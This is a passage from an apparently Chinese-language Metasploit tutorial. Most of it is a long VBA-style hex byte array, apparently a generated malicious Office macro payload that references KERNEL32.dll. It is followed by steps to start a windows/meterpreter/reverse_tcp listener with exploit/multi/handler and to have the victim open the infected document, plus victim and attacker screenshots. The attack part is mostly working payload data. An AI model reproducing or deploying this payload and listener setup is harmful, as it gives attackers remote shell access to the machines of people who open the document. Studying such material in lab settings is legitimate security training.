H1E&amp;HDF&amp;H55&amp;HFE&amp;H34&amp;H23&amp;H42&amp;H4E&amp;HF9&amp;HC8&amp;H94&amp;H63&amp;H8F&amp;HB8&amp;H89&amp;H29&amp;H46&amp;HE6&amp;HCA&amp;HAD&amp;HA3&amp;HE0&amp;HBC&amp;HEF&amp;H7F&amp;HEC&amp;H1E&amp;H21&amp;H05&amp;HA4&amp;H91&amp;H39&amp;H94&amp;HF9&amp;H7B&amp;H39&amp;HA6&amp;H70&amp;H9C&amp;HCF&amp;HAA&amp;H04&amp;HAD&amp;H5C&amp;H47&amp;HB3&amp;H30&amp;H8D&amp;H48&amp;H5C&amp;HA0&amp;H00&amp;H05&amp;H44&amp;H81&amp;H3A&amp;HE4&amp;H1F&amp;H1D&amp;H81&amp;HF9&amp;HBF&amp;H12&amp;HF8&amp;H18&amp;HE5&amp;H05&amp;HF2&amp;HE6&amp;H01&amp;HB1&amp;HC3&amp;H11&amp;H3E&amp;HE2&amp;H19&amp;HBC&amp;H72&amp;H8B&amp;H79&amp;HA6&amp;HE6&amp;HC0&amp;HC7&amp;HD4&amp;HAA&amp;HDF&amp;H63&amp;HF4&amp;H95&amp;H65&amp;HF6&amp;H30&amp;H9B&amp;HBB&amp;HE7&amp;H02&amp;H68&amp;H0F&amp;HB0&amp;H2B&amp;H6F&amp;H7A&amp;H61&amp;H23&amp;H1E&amp;HB6&amp;H24&amp;HCF&amp;H61&amp;H82&amp;H27&amp;H84&amp;H72&amp;HD5&amp;H21&amp;H1E&amp;HB6&amp;HCC&amp;HDA&amp;HB0&amp;H21&amp;HA0&amp;H56&amp;H24&amp;HCC&amp;HDB&amp;HC6&amp;H0D&amp;HA5&amp;HDF&amp;H4E&amp;H64&amp;HE6&amp;HFE&amp;H08&amp;HE3&amp;H4A&amp;HCA&amp;H47&amp;HF9&amp;H52&amp;H5F&amp;H09&amp;HEA&amp;H57&amp;HA3&amp;H60&amp;HD9&amp;HF8&amp;H3B&amp;H87&amp;HAD&amp;H6A&amp;H3D&amp;H44&amp;H8D&amp;H42&amp;H0A&amp;H8D&amp;H00&amp;HA2&amp;H47&amp;H18&amp;HF4&amp;H5B&amp;H03&amp;H18&amp;H4F&amp;HFD&amp;H7D&amp;HF4&amp;HB9&amp;HC5&amp;HDA&amp;H2E&amp;H47&amp;H8B&amp;H7B&amp;HB6&amp;HCF&amp;HF2&amp;H6A&amp;HEC&amp;H36&amp;H17&amp;H09&amp;HE8&amp;HA4&amp;HB5&amp;HE2&amp;HDC&amp;H5F&amp;HAE&amp;HF4&amp;HB1&amp;HE6&amp;H47&amp;HDE&amp;HEB&amp;H97&amp;H7A&amp;H26&amp;H9F&amp;HDD&amp;H49&amp;H40&amp;H98&amp;H67&amp;HC3&amp;HCB&amp;H88&amp;HC8&amp;H9A&amp;HE0&amp;H8A&amp;HD5&amp;H34&amp;HCA&amp;HA3&amp;HC3&amp;H89&amp;HCC&amp;H61&amp;H9D&amp;HC2&amp;H6C&amp;HDD&amp;H15&amp;HAF&amp;HBD&amp;HF0&amp;HB2&amp;H74&amp;H38&amp;H64&amp;H73&amp;H5A&amp;H17&amp;HE9&amp;H4D&amp;H1B&amp;H78&amp;HC9&amp;H8C&amp;H28&amp;H92&amp;H89&amp;H65&amp;H2D&amp;H8C&amp;H7F&amp;HC7&amp;HA5&amp;H6C&amp;H17&amp;H59&amp;HAE&amp;H40&amp;H1E&amp;HC5&amp;H99&amp;H6D&amp;HF6&amp;H1F&amp;H50&amp;H9C&amp;HE7&amp;H10&amp;HCE&amp;H65&amp;HC7&amp;H72&amp;H70&amp;H3A&amp;HDE&amp;H97&amp;H92&amp;H09&amp;HED&amp;H6A&amp;H58&amp;HF8&amp;HF8&amp;H8F&amp;H6F&amp;H1C&amp;H0E&amp;HFE&amp;H6F&amp;H83&amp;H89&amp;H11&amp;HEB&amp;H6B&amp;HA5&amp;HC1&amp;HE4&amp;H1A&amp;HAA&amp;H20&amp;H1A&amp;H8F&amp;H96&amp;HFA&amp;H74&amp;H21&amp;HC1&amp;HCD&amp;H08&amp;H82&amp;HF0&amp;H1A&amp;H2E&amp;HB2&amp;H86&amp;HDD&amp;H17&amp;H11&amp;H7C&amp;H5F&amp;HC9&amp;H5E&amp;H94&amp;H69&amp;H21&amp;H0D&amp;H74&amp;H9E&amp;HCC&amp;H55&amp;HB2&amp;H06&amp;HD9&amp;H76&amp;HF5&amp;H3B&amp;HCA&amp;H52&amp;HFB&amp;HC2&amp;H1A&amp;H14&amp;H08&amp;HB7&amp;H2E&amp;HEA&amp;HD0&amp;H64&amp;H16&amp;H29&amp;H7D&amp;HA5&amp;H69&amp;H99&amp;H90&amp;HFA&amp;HF3&amp;H7C&amp;HFF&amp;HF9&amp;H64&amp;H0F&amp;H7F&amp;HE0&amp;HBF&amp;H91&amp;HDA&amp;H11&amp;HF9&amp;HC5&amp;H70&amp;H1B&amp;HE1&amp;H56&amp;H18&amp;H2B&amp;H13&amp;HE3&amp;H50&amp;H09&amp;H99&amp;H7B&amp;H63&amp;H83&amp;H3B&amp;H8D&amp;HBD&amp;H4F&amp;H3D&amp;HF8&amp;HAD&amp;HE8&amp;H68&amp;H21&amp;HEB&amp;H2F&amp;H90&amp;H09&amp;HEF&amp;H4E&amp;H76&amp;H1F&amp;HD5&amp;H20&amp;HCB&amp;HA2&amp;HBC&amp;H43&amp;HC1&amp;HFA&amp;H32&amp;HEE&amp;H6D&amp;H57&amp;HEE&amp;HEF&amp;H4B&amp;HC1&amp;H02&amp;H6D&amp;H92&amp;H37&amp;H9F&amp;H20&amp;H4E&amp;H3B&amp;H35&amp;H23&amp;H42&amp;H50&amp;H63&amp;H5F&amp;HAC&amp;H20&amp;H9E&amp;H07&amp;HD6&amp;H6C&amp;HEB&amp;H3B&amp;H5A&amp;H19&amp;H6E&amp;H67&amp;H9E&amp;H99&amp;H07&amp;H7E&amp;H15&amp;H37&amp;H0A&amp;H6B&amp;HE6&amp;H1B&amp;H2E&amp;H85&amp;HEE&amp;H8A&amp;H3C&amp;HF9&amp;HAB&amp;H1F&amp;H0B&amp;H29&amp;H0B&amp;H74&amp;H07&amp;H6B&amp;H37&amp;HB3&amp;HE7&amp;H1D&amp;H73&amp;HDB&amp;HD2&amp;H72&amp;HE4&amp;HB5&amp;H95&amp;H21&amp;H52&amp;HC1&amp;HCD&amp;H6D&amp;H52&amp;H8F&amp;H1E&amp;H27&amp;H36&amp;HE2&amp;HD4&amp;H11&amp;H0E&amp;HB3&amp;HB6&amp;H06&amp;H5A&amp;HFF&amp;H68&amp;H04&amp;HD1&amp;H50&amp;HA1&amp;H18&amp;H96&amp;HCD&amp;HD5&amp;HA4&amp;HB1&amp;H00&amp;H86&amp;H41&amp;HAC&amp;H8C&amp;H84&amp;H08&amp;H87&amp;HD8&amp;H41&amp;H9C&amp;H48&amp;H21&amp;H03&amp;H55&amp;H97&amp;HC6&amp;H2C&amp;H88&amp;H37&amp;HE4&amp;H13&amp;H41&amp;HDF&amp;H44&amp;H26&amp;H1B&amp;H84&amp;H52&amp;H83&amp;H5A&amp;H96&amp;HCC&amp;HF6&amp;H2D&amp;HFD&amp;HAA&amp;H12&amp;H23&amp;H0B&amp;H00&amp;H41&amp;H36&amp;H6E&amp;H3E&amp;H24&amp;H7E&amp;HBC&amp;H75&amp;HAC&amp;H68&amp;HD7&amp;HC8&amp;HDB&amp;H38&amp;H91&amp;H7B&amp;H6B&amp;HD7&amp;H0C&amp;H53&amp;H17&amp;H80&amp;HE1&amp;HD8&amp;HE3&amp;HEF&amp;H26&amp;H7D&amp;HF2&amp;HD8&amp;H72&amp;HE8&amp;H90&amp;H93&amp;HC9&amp;H3C&amp;H1C&amp;H06&amp;HF5&amp;H6C&amp;HEC&amp;H39&amp;H94&amp;HD4&amp;H05&amp;HCD&amp;H1F&amp;HC5&amp;H36&amp;HBF&amp;H29&amp;H1B&amp;HCC&amp;HC4&amp;H71&amp;H57&amp;H47&amp;H27&amp;H9B&amp;H91&amp;H87&amp;HB3&amp;H60&amp;H5F&amp;H94&amp;HE7&amp;HC1&amp;H59&amp;H66&amp;H56&amp;H6B&amp;HA8&amp;H34&amp;H8A&amp;H64&amp;HBC&amp;H1D&amp;HD5&amp;H74&amp;H1C&amp;H49&amp;H20&amp;H27&amp;HA7&amp;HF8&amp;HA3&amp;HBB&amp;H02&amp;H44&amp;H76&amp;H6F&amp;H5A&amp;H63&amp;H4E&amp;H72&amp;HE7&amp;H89&amp;HC2&amp;HBB&amp;H5D&amp;H95&amp;HF3&amp;H71&amp;H4C&amp;H44&amp;H7F&amp;HBF&amp;HCB&amp;HDD&amp;HD2&amp;H05&amp;H1F&amp;H66&amp;H50&amp;H8F&amp;HB6&amp;H95&amp;H1D&amp;H25&amp;HB8&amp;H01&amp;H70&amp;HA5&amp;H07&amp;H76&amp;H49&amp;HBD&amp;HAE&amp;H98&amp;H3C&amp;H96&amp;HED&amp;HBE&amp;H11&amp;H55&amp;H79&amp;H09&amp;HA2&amp;HA3&amp;H35&amp;H15&amp;H36&amp;H24&amp;H59&amp;H53&amp;HF3&amp;H1A&amp;H87&amp;HE9&amp;HBB&amp;H42&amp;H79&amp;H8C&amp;HBF&amp;H71&amp;H03&amp;HE7&amp;HEA&amp;HF4&amp;HF6&amp;H85&amp;HE5&amp;HC5&amp;H3A&amp;H50&amp;HCA&amp;HE2&amp;HEC&amp;H0A&amp;H95&amp;H81&amp;HE5&amp;H65&amp;H69&amp;H08&amp;H62&amp;H44&amp;HE8&amp;H47&amp;H14&amp;HEF&amp;H89&amp;H07&amp;HAF&amp;HAA&amp;H8A&amp;HC6&amp;HB7&amp;HA5&amp;H8B&amp;HDC&amp;H63&amp;HE3&amp;HFA&amp;H65&amp;H8B&amp;HD8&amp;H01&amp;HF2&amp;HEF&amp;H39&amp;H38&amp;H45&amp;H7E&amp;H9B&amp;HF5&amp;HFD&amp;HC0&amp;H59&amp;H70&amp;H5C&amp;H60&amp;HC9&amp;H06&amp;HC8&amp;HE6&amp;H65&amp;HEB&amp;H26&amp;H80&amp;H27&amp;HB7&amp;H08&amp;H8D&amp;H6B&amp;HBE&amp;H06&amp;H45&amp;HF2&amp;HB3&amp;H9D&amp;HE9&amp;HE4&amp;H29&amp;H82&amp;H74&amp;H34&amp;HF3&amp;HB6&amp;HDE&amp;H75&amp;HE5&amp;H43&amp;H9C&amp;HE9&amp;H4D&amp;HE8&amp;H22&amp;HD4&amp;HA3&amp;H31&amp;H4E&amp;H09&amp;H18&amp;H8E&amp;HE8&amp;H2B&amp;H81&amp;HE4&amp;HB6&amp;H81&amp;HF8&amp;H82&amp;HF3&amp;HE2&amp;H0D&amp;HA3&amp;H5E&amp;HD1&amp;HDF&amp;HB4&amp;H7C&amp;H49&amp;HEF&amp;HC5&amp;H5D&amp;H4A&amp;H4D&amp;HFE&amp;H2D&amp;HAB&amp;H6D&amp;H7D&amp;H15&amp;H90&amp;H50&amp;H80&amp;HCF&amp;HB3&amp;H8C&amp;H4E&amp;HCD&amp;H60&amp;HEA&amp;HD0&amp;H1E&amp;H29&amp;H39&amp;HEE&amp;H2F&amp;H5A&amp;H65&amp;HC0&amp;HA4&amp;HCD&amp;HC4&amp;H77&amp;HF1&amp;HF1&amp;H44&amp;H0A&amp;H17&amp;H9D&amp;HE0&amp;H46&amp;HAC&amp;H4D&amp;HD7&amp;H72&amp;H8E&amp;H79&amp;H2A&amp;HBB&amp;H41&amp;H6F&amp;H3D&amp;H77&amp;H59&amp;HF0&amp;HFD&amp;H46&amp;HD9&amp;H40&amp;HFB&amp;H85&amp;HD1&amp;H1E&amp;H56&amp;H8F&amp;H69&amp;HBD&amp;H82&amp;H12&amp;HD1&amp;H56&amp;H89&amp;H9A&amp;H92&amp;H09&amp;HBA&amp;HAE&amp;HA6&amp;HB2&amp;H32&amp;H67&amp;H58&amp;HC9&amp;HD5&amp;H3A&amp;H94&amp;HC8&amp;H9E&amp;H2F&amp;H48&amp;H13&amp;H99&amp;HEF&amp;HB8&amp;H37&amp;HC0&amp;H55&amp;H3F&amp;H5F&amp;H76&amp;H7A&amp;H36&amp;HE6&amp;H88&amp;HAF&amp;H97&amp;HBF&amp;HDA&amp;H4B&amp;HF4&amp;H21&amp;HF3&amp;H16&amp;H85&amp;HDC&amp;HA5&amp;H3A&amp;HF4&amp;H5F&amp;H14&amp;HF2&amp;HF2&amp;H84&amp;H28&amp;HA7&amp;HD0&amp;HB4&amp;H37&amp;HFE&amp;HD8&amp;H19&amp;H9D&amp;HEC&amp;HE5&amp;H00&amp;H9C&amp;HCB&amp;HC2&amp;H03&amp;H5A&amp;HC7&amp;H6D&amp;HDA&amp;H99&amp;H99&amp;H85&amp;H7B&amp;HA0&amp;HC3&amp;HF6&amp;H5E&amp;H41&amp;HEB&amp;H88&amp;H9F&amp;HD8&amp;H9F&amp;H6F&amp;H33&amp;HD4&amp;H22&amp;HA2&amp;H31&amp;H86&amp;H75&amp;H9E&amp;H9F&amp;H95&amp;H50&amp;H2E&amp;H14&amp;H53&amp;HF7&amp;H84&amp;H5D&amp;H95&amp;H8C&amp;HFE&amp;HB3&amp;H11&amp;H30&amp;HD5&amp;H80&amp;H0B&amp;H81&amp;H7B&amp;H0C&amp;H3F&amp;HB0&amp;H94&amp;H68&amp;H61&amp;HBA&amp;HC5&amp;H8E&amp;HE4&amp;HF2&amp;HB7&amp;HE1&amp;H1A&amp;HCB&amp;HED&amp;H78&amp;H9F&amp;H6E&amp;H70&amp;HC9&amp;H20&amp;H65&amp;H4C&amp;H2C&amp;H5A&amp;HBD&amp;H05&amp;H24&amp;H31&amp;H50&amp;H8C&amp;H86&amp;H10&amp;H03&amp;H81&amp;HE2&amp;H34&amp;H3A&amp;H74&amp;HF7&amp;H92&amp;H48&amp;H5D&amp;H67&amp;H5C&amp;HA5&amp;H72&amp;HE8&amp;H3D&amp;HC7&amp;H44&amp;H2D&amp;HC2&amp;H31&amp;H13&amp;H87&amp;H31&amp;HBE&amp;H73&amp;H42&amp;H61&amp;H78&amp;HCB&amp;H8A&amp;H43&amp;H30&amp;H01&amp;H54&amp;H66&amp;H18&amp;H41&amp;HB0&amp;H5D&amp;H7A&amp;H03&amp;H89&amp;HAB&amp;H34&amp;HE2&amp;H9C&amp;HBC&amp;H62&amp;HB6&amp;H5F&amp;HE5&amp;H4C&amp;H12&amp;H34&amp;HA8&amp;H92&amp;H0C&amp;H2B&amp;HED&amp;H4A&amp;HDE&amp;H5C&amp;H62&amp;HFF&amp;H02&amp;H36&amp;H13&amp;H47&amp;HC4&amp;H2B&amp;H13&amp;HA8&amp;H62&amp;H53&amp;H62&amp;H2D&amp;H80&amp;H03&amp;H4E&amp;H01&amp;H79&amp;H91&amp;H4C&amp;H1C&amp;HE4&amp;H3A&amp;HCF&amp;HFB&amp;H8F&amp;HAD&amp;H63&amp;HDD&amp;HBE&amp;HF6&amp;HF5&amp;HEE&amp;HD9&amp;H15&amp;H82&amp;H4B&amp;H6A&amp;HDE&amp;H66&amp;H98&amp;H2B&amp;H65&amp;H7B&amp;H7F&amp;HF6&amp;H5B&amp;H43&amp;H55&amp;HE2&amp;HAF&amp;H69&amp;H18&amp;H8E&amp;HC1&amp;H8F&amp;H38&amp;HD7&amp;HC8&amp;HE0&amp;H2B&amp;H99&amp;H0E&amp;HAD&amp;HA4&amp;H4D&amp;H6B&amp;H2E&amp;H22&amp;HFB&amp;HD6&amp;HD6&amp;HEB&amp;HCC&amp;H68&amp;H56&amp;H3F&amp;HD0&amp;H1E&amp;H68&amp;H44&amp;HF1&amp;H45&amp;H1E&amp;H09&amp;H39&amp;H63&amp;H8F&amp;HCB&amp;H29&amp;H30&amp;HC3&amp;H21&amp;H6E&amp;HF0&amp;HE6&amp;HAD&amp;HFB&amp;H93&amp;H21&amp;H96&amp;HA5&amp;H84&amp;H7D&amp;H97&amp;H6E&amp;H50&amp;H20&amp;H23&amp;H4F&amp;HAF&amp;H3C&amp;HAE&amp;H4C&amp;H21&amp;HE1&amp;HF1&amp;HFE&amp;H13&amp;H65&amp;H6D&amp;H56&amp;H0C&amp;HC2&amp;HD8&amp;H57&amp;HB0&amp;H49&amp;H9E&amp;H57&amp;H78&amp;H6C&amp;H62&amp;H15&amp;H29&amp;H2D&amp;H90&amp;HAF&amp;HD5&amp;H36&amp;HF6&amp;HD1&amp;H6C&amp;H37&amp;H76&amp;HB9&amp;HCF&amp;H6E&amp;HDD&amp;H8C&amp;HF8&amp;H80&amp;H9F&amp;HE9&amp;H81&amp;H0C&amp;HA2&amp;HCA&amp;H45&amp;H5A&amp;H45&amp;H59&amp;HE9&amp;H24&amp;H1F&amp;HB5&amp;H91&amp;H0B&amp;H0A&amp;H43&amp;H44&amp;H81&amp;HA3&amp;H6C&amp;H2C&amp;H6D&amp;H83&amp;HF2&amp;HD8&amp;HA3&amp;HDA&amp;HC3&amp;HB9&amp;HE5&amp;H97&amp;H87&amp;H09&amp;HFF&amp;HEF&amp;H1E&amp;HBE&amp;H6B&amp;H1A&amp;H47&amp;H02&amp;H53&amp;HD4&amp;HC7&amp;H65&amp;HAB&amp;H64&amp;H0D&amp;HAB&amp;H0B&amp;H7D&amp;HF0&amp;H45&amp;H0A&amp;H5C&amp;H6F&amp;HF5&amp;HE5&amp;H06&amp;HB9&amp;H2F&amp;H1A&amp;HB4&amp;HB6&amp;HB6&amp;H8F&amp;H67&amp;H8F&amp;H6F&amp;HC8&amp;H83&amp;HBE&amp;H50&amp;HF8&amp;H8F&amp;H91&amp;H50&amp;HE4&amp;H69&amp;HFD&amp;H46&amp;H23&amp;HA3&amp;HAF&amp;HA4&amp;H99&amp;H82&amp;H20&amp;H7D&amp;H0A&amp;H0D&amp;H99&amp;H4D&amp;H61&amp;HA3&amp;HBD&amp;H1A&amp;H29&amp;HF7&amp;HF3&amp;H2D&amp;H5C&amp;HCB&amp;HB2&amp;H84&amp;HC4&amp;H1F&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00
+&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H2C&amp;H30&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H54&amp;H30&amp;H00&amp;H00&amp;H38&amp;H30&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H30&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H30&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H9C&amp;H00&amp;H45&amp;H78&amp;H69&amp;H74&amp;H50&amp;H72&amp;H6F&amp;H63&amp;H65&amp;H73&amp;H73&amp;H00&amp;H00&amp;H00&amp;H00&amp;H30&amp;H00&amp;H00&amp;H4B&amp;H45&amp;H52&amp;H4E&amp;H45&amp;H4C&amp;H33&amp;H32&amp;H2E&amp;H64&amp;H6C&amp;H6C&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H02&amp;H18&amp;H59&amp;HC2&amp;HD2&amp;H36&amp;HA2&amp;H63&amp;HEB&amp;HE4&amp;H2B&amp;H75&amp;HBD&amp;H53&amp;HB9&amp;H03&amp;H68&amp;HDE&amp;HF3&amp;H0D&amp;H28&amp;H81&amp;HAE&amp;HB3&amp;HCA&amp;HDA&amp;HDE&amp;HEC&amp;H53&amp;H9B&amp;HD5&amp;H65&amp;HD0&amp;H08&amp;H4B&amp;H7A&amp;H34&amp;HE5&amp;HF2&amp;H72&amp;H35&amp;HF1&amp;H2B&amp;H59&amp;H32&amp;H85
+</code></pre></div><ol start="3">
+<li>
+<p>监听设置</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">  模块为：exploit/multi/handler
+
+  payload为：windows/meterpreter/reverse_tcp
+
+  设置本机地址的LHOST和监听端口号LPORT
+</code></pre></div></li>
+<li>
+<p>靶机运行文档，宏感染随文件传递</p>
+<p><strong>靶机画面：</strong></p>
+</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/fool-boop/images@master/MetaSploitFramework/10.5cv3uelx4ds0.png" alt="10"></p>
+<p><strong>攻击方画面：</strong></p>
